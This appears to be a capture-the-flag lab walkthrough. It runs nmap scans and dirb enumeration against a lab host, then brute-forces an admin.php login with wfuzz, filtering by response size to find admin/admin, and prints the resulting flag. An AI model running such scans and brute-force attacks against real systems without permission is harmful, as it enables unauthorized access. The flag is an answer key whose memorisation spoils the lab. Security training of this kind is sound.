Use ***ping*** to check if the host is up.
```console
kali@kali:~$ sudo ping 10.129.189.69 -c 1 
PING 10.129.189.69 (10.129.189.69) 56(84) bytes of data.
64 bytes from 10.129.189.69: icmp_seq=1 ttl=63 time=11.0 ms

--- 10.129.189.69 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 11.006/11.006/11.006/0.000 ms
```

Run an ***nmap*** scan on the top 1000 ports.
```console
kali@kali:~$ sudo nmap -A 10.129.189.69 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-03 08:19 EST
Nmap scan report for 10.129.189.69
Host is up (0.024s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Welcome to nginx!
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/3%OT=80%CT=1%CU=32204%PV=Y%DS=2%DC=T%G=Y%TM=638B4D0
OS:7%P=x86_64-pc-linux-gnu)SEQ(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=108%GCD=1%ISR=10B%TI=Z%CI=Z%TS=A)OPS(O1=M539ST11NW7%O2=M539ST11NW7%O
OS:3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11NW7%O6=M539ST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M539NNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)U1(R=N)IE(R=Y%DFI=N%T=40%CD=S)IE(R=N)

Network Distance: 2 hops

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   70.55 ms 10.10.14.1
2   70.79 ms 10.129.189.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.71 seconds
```

Run a concurrent ***nmap*** scan on all ports.
```console
kali@kali:~$ sudo nmap -A 10.129.189.69 -p- 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-12-03 08:19 EST
Nmap scan report for 10.129.189.69
Host is up (0.018s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=12/3%OT=80%CT=1%CU=30473%PV=Y%DS=2%DC=T%G=Y%TM=638B4E6
OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10E%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M539ST11NW7%O2=M539ST11NW7%O3=M539NNT11NW7%O4=M539ST11NW7%O5=M539ST11
OS:NW7%O6=M539ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M539NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops

TRACEROUTE (using port 554/tcp)
HOP RTT      ADDRESS
1   11.66 ms 10.10.14.1
2   12.94 ms 10.129.189.69

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 358.91 seconds
```

Make a **GET request** for the index page on the target web server using ***curl***.
```console
kali@kali:~$ curl http://10.129.189.69
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
    body {
        width: 35em;
        margin: 0 auto;
        font-family: Tahoma, Verdana, Arial, sans-serif;
    }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>

<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>

<p><em>Thank you for using nginx.</em></p>
</body>
</html>
```

**Enumerate** the web directories on the server using ***dirb***.
```console
kali@kali:~$ dirb http://10.129.189.69

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sat Dec  3 08:37:42 2022
URL_BASE: http://10.129.189.69/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://10.129.189.69/ ----
+ http://10.129.189.69/admin.php (CODE:200|SIZE:999)                                                          
                                                                                                              
-----------------
END_TIME: Sat Dec  3 08:39:05 2022
DOWNLOADED: 4612 - FOUND: 1
```

Make a **GET request** the admin page using ***curl***.
```console
kali@kali:~$ curl 10.129.189.69/admin.php
<!DOCTYPE html>
<html>
<title>Admin Console</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="w3.css">
<body class="w3-container" style="background-color:#F6F6F6;">

<h2 align="center">Admin Console Login</h2>


<div id="id01" class="w3-container">
  <form method="post">
  <div class="w3-modal-content w3-card-8 w3-animate-zoom" style="max-width:600px">
    <div class="w3-container">
      <div class="w3-section">
        <label><b>Username</b></label>
        <input class="w3-input w3-border w3-hover-border-black w3-margin-bottom" type="text" placeholder="Enter Username" name="username">

        <label><b>Password</b></label>
        <input class="w3-input w3-border w3-hover-border-black" type="password" placeholder="Enter Password" name="password">
        
        <input type="submit" class="w3-btn w3-btn-block w3-green w3-section" value="Login">
      </div>
    </div>
  </div>
  </form>
</div>
            
</body>
</html>
```

Begin brute forcing the admin console login credentials using wfuzz with the common.txt wordlist.
```console
kali@kali:~$ wfuzz -c -z list,admin-administrator-root-user-guest -z file,/usr/share/wordlists/wfuzz/general/common.txt  -d "username=FUZZ&password=FUZ2Z" http://10.129.189.69:80/admin.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target:  http://10.129.189.69:80/admin.php
Total requests: 4755

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                   
=====================================================================

000000001:   200        31 L     71 W       1071 Ch     "admin - @"                                               
000000014:   200        31 L     71 W       1071 Ch     "admin - 2000"
...
```

Invalid credentials return a **200 OK response** so we use characters instead to filter out invalid credentials from the output.
```console
wfuzz --help
...
--hc/hl/hw/hh N[,N]+      : Hide responses with the specified code/lines/words/chars (Use BBB for taking values from baseline)
```

Brute force the admin console login using wfuzz with the common.txt wordlist.
```console
kali@kali:~$ wfuzz --hh 1071 -c -z list,admin-administrator-root-user-guest -z file,/usr/share/wordlists/wfuzz/general/common.txt -d "username=FUZZ&password=FUZ2Z"  http://10.129.189.69:80/admin.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.129.189.69:80/admin.php
Total requests: 4755

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                   
=====================================================================

000000035:   200        9 L      25 W       365 Ch      "admin - admin"                                           

Total time: 0
Processed Requests: 4755
Filtered Requests: 4754
Requests/sec.: 0
```

We found valid credentials. Make a **POST request** with the form data using ***curl***.
```console
kali@kali:~$ curl -X POST 10.129.189.69/admin.php -d "username=admin&password=admin"
<!DOCTYPE html>
<html>
<title>Admin Console</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="w3.css">
<body class="w3-container" style="background-color:#F6F6F6;">

<h2 align="center">Admin Console Login</h2>

<h4 style='text-align:center'>Congratulations! Your flag is: 6483bee07c1c1d57f14e5b0717503c73</h4>
```
